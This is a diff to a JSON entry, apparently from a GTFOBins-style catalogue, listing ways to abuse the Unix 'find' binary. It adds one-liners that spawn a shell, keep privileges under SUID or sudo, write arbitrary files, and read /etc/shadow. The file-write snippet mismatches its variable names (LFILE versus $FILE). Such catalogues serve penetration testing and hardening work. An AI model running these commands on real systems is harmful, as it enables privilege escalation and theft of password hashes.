@@ -2,17 +2,32 @@
   "functions": {
     "shell": [
       {
-        "code": "find . -exec /bin/sh \\; -quit"
+        
+        "code": "find . -exec /bin/sh \\; -quit\n"
       }
     ],
     "suid": [
       {
-        "code": "./find . -exec /bin/sh -p \\; -quit"
+        
+        "code": "./find . -exec /bin/sh -p \\; -quit\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo find . -exec /bin/sh \\; -quit"
+        
+        "code": "sudo find . -exec /bin/sh \\; -quit\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "DATA is a format string, it supports some escape sequences.",
+        "code": "LFILE=file_to_write\nfind / -fprintf \"$FILE\" DATA -quit\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "",
+        "code": "find /etc -name shadow -exec cat {} \\;\n"
       }
     ]
   }
